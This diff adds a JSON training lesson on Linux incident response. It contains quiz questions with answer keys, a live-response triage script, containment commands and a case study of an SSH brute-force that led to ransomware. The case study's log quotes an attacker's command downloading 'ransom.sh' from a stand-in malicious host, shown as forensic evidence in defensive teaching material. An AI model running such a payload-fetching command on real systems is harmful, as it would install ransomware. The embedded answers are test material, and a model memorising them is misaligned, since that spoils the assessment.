@@ -1,0 +1,118 @@
+{
+  "lesson_id": "a1b2c3d4-5e6f-7a8b-9c0d-1e2f3a4b5c6d",
+  "domain": "dfir",
+  "title": "Linux Incident Response Fundamentals",
+  "difficulty": 1,
+  "order_index": 245,
+  "prerequisites": ["Digital Forensics 101: Your First Investigation"],
+  "concepts": ["Why Linux IR is different from Windows IR", "Current Linux threat landscape", "SANS six-step IR methodology adapted for Linux", "Linux-specific IR challenges", "Building Linux IR capabilities", "Essential Linux IR tools", "Live response vs. forensic imaging", "Evidence preservation on Linux"],
+  "estimated_time": 35,
+  "learning_objectives": ["Understand why Linux IR requires different skills and tools than Windows IR", "Apply the SANS six-step IR methodology to Linux-specific scenarios", "Identify key Linux artifacts and their locations for incident investigation", "Distinguish between live response and forensic imaging approaches", "Set up a basic Linux IR toolkit for incident response"],
+  "post_assessment": [
+    {
+      "question_id": "linux-ir-001",
+      "question": "Why is Linux incident response fundamentally different from Windows IR?",
+      "options": ["Linux doesn't have a registry, so there are fewer artifacts to analyze", "Linux systems are typically more transparent with more accessible system state information, but lack centralized artifact repositories", "Linux is more secure and never gets compromised", "Windows tools work on Linux without modification"],
+      "correct_answer": 1,
+      "explanation": "Linux provides extensive system state through /proc, syslogs, and text-based configurations, making live analysis powerful. However, it lacks centralized artifact repositories like the Windows Registry, Event Logs, or Prefetch. This means different collection strategies and analysis approaches are required.",
+      "type": "multiple_choice",
+      "difficulty": 1
+    },
+    {
+      "question_id": "linux-ir-002",
+      "question": "In the SANS six-step IR methodology, which step involves removing the attacker's access to the system?",
+      "options": ["Identification", "Containment", "Eradication", "Recovery"],
+      "correct_answer": 2,
+      "explanation": "Eradication is the step where you remove the attacker's foothold — deleting backdoors, removing unauthorized accounts, patching vulnerabilities. Containment limits the spread, but eradication removes the root cause. This distinction matters: containment without eradication means the attacker comes back.",
+      "type": "multiple_choice",
+      "difficulty": 1
+    },
+    {
+      "question_id": "linux-ir-003",
+      "question": "What is the MOST important first action when performing live response on a Linux system?",
+      "options": ["Reboot the system to safe mode", "Record the current time and system state before making any changes", "Immediately pull the network cable", "Install security updates"],
+      "correct_answer": 1,
+      "explanation": "Before ANY action on a live system, document the current state — timestamp, running processes, network connections, logged-in users. Every action you take modifies the system. Without a baseline record, you can't distinguish your artifacts from the attacker's. Network isolation should come AFTER initial evidence collection if possible.",
+      "type": "multiple_choice",
+      "difficulty": 1
+    },
+    {
+      "question_id": "linux-ir-004",
+      "question": "Which Linux directory contains real-time process and system information that is invaluable for live response?",
+      "options": ["/etc", "/var/log", "/proc", "/tmp"],
+      "correct_answer": 2,
+      "explanation": "The /proc filesystem (procfs) is a virtual filesystem that provides real-time kernel and process information. /proc/[pid]/ contains details about each running process including command line, environment, memory maps, and open file descriptors. It's the Linux equivalent of Windows' live process analysis capabilities.",
+      "type": "multiple_choice",
+      "difficulty": 1
+    },
+    {
+      "question_id": "linux-ir-005",
+      "question": "Why should you prefer statically-compiled binaries for Linux IR toolkits?",
+      "options": ["They run faster than dynamically-linked binaries", "They don't depend on potentially compromised system libraries", "They are smaller in file size", "They automatically update with the system"],
+      "correct_answer": 1,
+      "explanation": "On a compromised system, shared libraries (.so files) may have been tampered with by rootkits or malware. Statically-linked binaries are self-contained and don't trust the system's libraries. This is why tools like BusyBox are compiled statically for IR use — they execute from trusted media without relying on the suspect system.",
+      "type": "multiple_choice",
+      "difficulty": 2
+    }
+  ],
+  "jim_kwik_principles": ["active_learning", "minimum_effective_dose", "teach_like_im_10", "memory_hooks", "meta_learning", "connect_to_what_i_know", "multiple_memory_pathways", "reframe_limiting_beliefs", "gamify_it", "learning_sprint"],
+  "content_blocks": [
+    {
+      "type": "mindset_coach",
+      "content": {
+        "text": "# Welcome to Linux Incident Response! 🐧🔍\n\nIf you've done Windows IR before, forget most of what you know. Linux is a different world.\n\n**Why Linux IR matters NOW:**\n- 96% of the world's top 1 million servers run Linux\n- 90% of cloud infrastructure runs on Linux\n- Linux malware increased 650% in 2023 (CrowdStrike)\n- Attackers specifically target Linux for ransomware, cryptomining, and botnets\n\n**The good news:** Linux gives you incredible visibility into system state. Almost everything is a file. The challenge is knowing WHERE to look and WHAT it means.\n\nThis lesson is your foundation for all Linux IR work ahead. Let's build it right! 🏗️"
+      }
+    },
+    {
+      "type": "explanation",
+      "content": {
+        "text": "# Why Linux IR Is Different\n\n## Linux vs Windows: Key Differences for IR\n\n| Aspect | Windows | Linux |\n|--------|---------|-------|\n| Central registry | Yes (Windows Registry) | No (distributed config files) |\n| Event logging | EVT/evtx binary format | syslog/journalctl text-based |\n| Process info | EPROCESS in memory | /proc filesystem (virtual) |\n| Persistence | Registry, Services, Scheduled Tasks | cron, systemd, .bashrc, init scripts |\n| Artifacts | Prefetch, AmCache, ShimCache | /var/log, .bash_history, /tmp |\n| Memory forensics | Mature (Volatility) | Growing (Volatility3, LiME) |\n\n## The Current Linux Threat Landscape\n\nTop attack vectors targeting Linux:\n1. **Web application exploits** — Unpatched CMS, APIs, frameworks\n2. **Credential brute-force** — SSH is the #1 target (22/tcp)\n3. **Supply chain** — Compromised packages and dependencies\n4. **Misconfigurations** — Default credentials, open management ports\n5. **Container escapes** — Kubernetes, Docker misconfigurations\n\n**Key stat:** 75% of Linux breaches involve known vulnerabilities with available patches. Patch management IS incident prevention.\n\n## Linux-Specific IR Challenges\n\n1. **Distro diversity** — Ubuntu, RHEL, Debian, Alpine — different package managers, log locations, and system layouts\n2. **Containerization** — Evidence may be ephemeral (containers are designed to be disposable)\n3. **Minimal logging** — Many Linux servers have limited default logging\n4. **Rootkits** — Linux rootkits can hook syscalls, modify /proc output, and hide processes\n5. **Ephemeral systems** — Auto-scaling cloud instances may be terminated before you can investigate"
+      }
+    },
+    {
+      "type": "explanation",
+      "content": {
+        "text": "# SANS Six-Step IR Methodology for Linux\n\n## 1. Preparation\nBefore an incident occurs:\n- Build a Linux IR toolkit (USB with statically-compiled tools)\n- Establish logging baselines (syslog, auditd, journalctl)\n- Document system configurations and network architecture\n- Set up centralized log collection (rsyslog, fluentd)\n\n## 2. Identification\nDetect and confirm the incident:\n```bash\n# Check for anomalous processes\nps auxf | grep -v '\\[' | sort -k3 -rn | head -20\n\n# Check network connections\nss -tlnp  # Listening ports\nss -tnp   # Established connections\n\n# Check recent logins\nlast -20\nlastlog\n\n# Check cron jobs\ncrontab -l\ncat /etc/crontab\nls -la /etc/cron.d/\n```\n\n## 3. Containment\nLimit the damage without destroying evidence:\n```bash\n# Block malicious IP (temporary)\niptables -A INPUT -s 203.0.113.0/24 -j DROP\n\n# Isolate system (careful with remote access)\niptables -P INPUT DROP\niptables -A INPUT -s <mgmt_net> -j ACCEPT\n\n# Capture volatile data FIRST\ndate; who; w; last > /tmp/ir_evidence.txt\n```\n\n## 4. Eradication\nRemove the attacker's foothold:\n- Kill malicious processes\n- Remove backdoor files and unauthorized SSH keys\n- Delete unauthorized cron jobs and systemd services\n- Patch the vulnerability that allowed initial access\n\n## 5. Recovery\nRestore normal operations:\n- Rebuild from known-good images (preferred for cloud)\n- Rotate ALL credentials (especially SSH keys)\n- Verify system integrity (rpm -Va, debsums)\n- Monitor for reinfection indicators\n\n## 6. Lessons Learned\nDocument and improve:\n- What happened and how?\n- What was the root cause?\n- What detection gaps existed?\n- What process improvements are needed?"
+      }
+    },
+    {
+      "type": "code_exercise",
+      "content": {
+        "text": "# Live Response Script: Initial Triage\n\nWhen you first access a potentially compromised Linux system, run this triage sequence:\n\n```bash\n#!/bin/bash\n# Linux IR Initial Triage Script\n# Run from trusted USB/mount — DO NOT trust system binaries\n\nEVIDENCE_DIR=\"/tmp/ir_evidence_$(date +%Y%m%d_%H%M%S)\"\nmkdir -p \"$EVIDENCE_DIR\"\n\necho \"=== System Timestamp ===\" > \"$EVIDENCE_DIR/system_state.txt\"\ndate >> \"$EVIDENCE_DIR/system_state.txt\"\n\necho \"=== Running Processes ===\" >> \"$EVIDENCE_DIR/system_state.txt\"\nps auxfww >> \"$EVIDENCE_DIR/system_state.txt\"\n\necho \"=== Network Connections ===\" >> \"$EVIDENCE_DIR/system_state.txt\"\nss -tlnp >> \"$EVIDENCE_DIR/system_state.txt\"\nss -tnp >> \"$EVIDENCE_DIR/system_state.txt\"\n\necho \"=== Logged-in Users ===\" >> \"$EVIDENCE_DIR/system_state.txt\"\nw >> \"$EVIDENCE_DIR/system_state.txt\"\n\necho \"=== Last Logins ===\" >> \"$EVIDENCE_DIR/system_state.txt\"\nlast -20 >> \"$EVIDENCE_DIR/system_state.txt\"\n\necho \"=== Cron Jobs ===\" >> \"$EVIDENCE_DIR/system_state.txt\"\ncat /etc/crontab >> \"$EVIDENCE_DIR/system_state.txt\"\nls -la /etc/cron.d/ >> \"$EVIDENCE_DIR/system_state.txt\"\n\necho \"=== SSH Authorized Keys ===\" >> \"$EVIDENCE_DIR/system_state.txt\"\ncat /root/.ssh/authorized_keys >> \"$EVIDENCE_DIR/system_state.txt\"\nfind /home -name authorized_keys -exec cat {} \\; >> \"$EVIDENCE_DIR/system_state.txt\"\n\necho \"=== Suspicious /tmp files ===\" >> \"$EVIDENCE_DIR/system_state.txt\"\nls -la /tmp/ >> \"$EVIDENCE_DIR/system_state.txt\"\n```\n\n## Challenge:\nAfter running this script on a suspect system, you find:\n1. A process called `.hidden` running from /tmp\n2. An SSH key in /root/.ssh/authorized_keys that doesn't belong\n3. A cron job running every minute: `* * * * * /tmp/.hidden`\n\nWhat are your next three commands?",
+        "language": "bash",
+        "solution": "1. Examine the process: `ls -la /proc/<pid>/exe` and `cat /proc/<pid>/cmdline` to see what .hidden actually is. 2. Check the SSH key: `who` and `last` to see who added it and when. 3. Examine the cron job more: `cat /var/log/cron` to see how long it's been running. Then kill the process, remove the unauthorized key, and delete the cron job — but only AFTER capturing evidence."
+      }
+    },
+    {
+      "type": "real_world",
+      "content": {
+        "text": "# Case Study: The Linux SSH Brute-Force Turned Ransomware\n\n## The Attack\nA mid-size company's Ubuntu web server was compromised through SSH brute-force:\n\n**Timeline:**\n- Day 1: Brute-force attack began against SSH (22/tcp) from 50+ IPs\n- Day 2: Successfully guessed password for `deploy` user (password: `deploy123`)\n- Day 3: Attacker escalated to root via `sudo` misconfiguration\n- Day 4: Ransomware deployed, encrypted `/var/lib/mysql` and `/home`\n- Day 5: Company discovered the breach — 4 days after initial access\n\n## What IR Revealed\n```bash\n# Evidence of brute-force in auth.log\nMar 15 02:14:01 webserver sshd[12345]: Failed password for deploy from 203.0.113.42\nMar 15 02:14:01 webserver sshd[12345]: Failed password for deploy from 203.0.113.43\n# ... 14,000 failed attempts ...\nMar 15 02:14:33 webserver sshd[12345]: Accepted password for deploy from 203.0.113.42\n\n# Attacker's actions after login\nMar 15 02:15:01 webserver sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash\nMar 15 02:17:22 webserver sudo: deploy : COMMAND=wget http://evil.example/ransom.sh\n```\n\n## Root Causes Identified\n1. **Weak password:** `deploy123` for a service account\n2. **SSH exposed to internet:** No fail2ban or rate limiting\n3. **Excessive sudo:** `deploy` user had full root access\n4. **No centralized logging:** Logs stayed on the compromised server\n5. **No EDR:** No endpoint detection on the Linux server\n\n## Lessons Applied\n- SSH key-only authentication (passwords disabled)\n- Cloudflare tunnel for SSH access (no direct internet exposure)\n- fail2ban with aggressive thresholds\n- Centralized syslog via rsyslog to Splunk\n- CrowdStrike Falcon deployed on all Linux servers"
+      }
+    },
+    {
+      "type": "explanation",
+      "content": {
+        "text": "# Teach Me Like I'm 10: Linux IR 🐧\n\nImagine your Linux computer is like a **house with glass walls** 🏠\n\n**Windows** is like a house with a **security camera system** — everything gets recorded in special formats (Event Logs, Registry) but you need special tools to watch the recordings.\n\n**Linux** is like a house where **everything is written on the walls** 📝 — you can SEE everything (it's all text files), but:\n- The writing can be erased easily (log rotation)\n- Different rooms have different writing styles (different distros)\n- Some rooms are temporary (containers disappear!)\n- The house has many doors (SSH, web, cron)\n\n**The six steps of IR are like responding to a break-in:**\n\n1. **Preparation** — Install locks and cameras before the break-in\n2. **Identification** — \"Someone broke in! I can see muddy footprints!\" 🔍\n3. **Containment** — \"Lock the doors so they can't get into more rooms!\" 🔒\n4. **Eradication** — \"Find and remove ALL the hidden cameras they planted\" 🗑️\n5. **Recovery** — \"Fix the broken window and change all the locks\" 🔧\n6. **Lessons Learned** — \"How did they get in? How do we prevent it next time?\" 📋\n\nThe key insight: Linux shows you everything, but you have to know WHERE to look! 🎯"
+      }
+    },
+    {
+      "type": "memory_aid",
+      "content": {
+        "text": "# Memory Hooks for Linux IR 🔗\n\n## Six Steps: **PICERL**\n**P**reparation → **I**dentification → **C**ontainment → **E**radication → **R**ecovery → **L**essons Learned\n\n(Think: \"**P**lease **I**nvestigate **C**arefully, **E**very **R**esponder **L**earns\")\n\n## Key Linux IR Locations: **PLCSH**\n- **P**roc → /proc (real-time process info)\n- **L**ogs → /var/log (syslog, auth, kern)\n- **C**ron → /etc/cron* (scheduled tasks)\n- **S**SH → ~/.ssh/ (keys and config)\n- **H**istory → ~/.bash_history (user commands)\n\n(Think: \"**P**eople **L**eave **C**lues **S**omewhere **H**ere\")\n\n## Live Response Order: **VDON**\n1. **V**olatile first (processes, network, memory)\n2. **D**isk data second (logs, configs, files)\n3. **O**ffline analysis third (forensic image)\n4. **N**etwork evidence last (pcaps, flow data)\n\n## Linux vs Windows: **WRPLC**\n- **W**indows has Registry → **L**inux has config files\n- **R**egistry is centralized → Configs are distributed\n- **P**refetch tracks execution → bash_history tracks commands\n- **L**ogs are binary (evtx) → Logs are text (syslog)\n- **C**lear distinction in approach needed!"
+      }
+    },
+    {
+      "type": "reflection",
+      "content": {
+        "text": "# Check Your Understanding\n\n1. **Why is Linux IR fundamentally different from Windows IR?** List three specific differences in artifact locations.\n\n2. **You respond to a compromised Linux server.** What are the first three commands you run, and in what order? Why that order?\n\n3. **A containerized environment was breached, but the container was terminated.** What evidence sources might still be available?\n\n4. **Why should you use statically-compiled tools from a USB drive** instead of the system's own binaries during live response?\n\n5. **You find an unauthorized SSH key in `/root/.ssh/authorized_keys`.** What three things should you check before removing it?"
+      }
+    },
+    {
+      "type": "mindset_coach",
+      "content": {
+        "text": "# You're Now Ready for Linux IR 🐧✨\n\nYou've built the foundation. Every advanced Linux IR technique builds on what you just learned:\n\n- The six-step methodology that keeps your response structured\n- The key artifact locations that reveal what happened\n- The live response approach that preserves volatile evidence\n- The difference between Linux and Windows that changes your entire strategy\n\n**Most important takeaway:** On Linux, transparency is your friend. Almost everything is visible if you know where to look. The challenge isn't visibility — it's knowing what matters.\n\nIn the next lessons, you'll dive deeper into specific Linux artifacts: package management evidence, filesystem forensics, and the Sleuth Kit for Linux. Each one adds a new tool to your IR arsenal.\n\nNow go practice! Set up a Linux VM, install your IR toolkit, and run the triage script against a clean system. When you respond to a real incident, muscle memory matters. 💪"
+      }
+    }
+  ],
+  "tags": ["Course: SANS-FOR577", "Career Path: DFIR Specialist"]
+}
